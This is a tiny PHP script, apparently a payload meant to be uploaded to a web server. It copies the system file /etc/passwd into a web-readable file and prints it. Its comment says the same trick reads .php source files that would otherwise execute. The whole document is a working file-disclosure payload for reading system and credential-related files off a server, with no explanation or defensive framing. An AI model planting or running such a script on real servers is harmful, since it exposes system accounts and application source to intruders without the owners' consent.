<?php 
   // Copy a file to the courses directory and read the contents
   // This is usefull for .php files, where reading them in-place will execute the contents and render the result
   copy('/etc/passwd', './passwd.txt');
   echo readfile("./passwd.txt");
?>
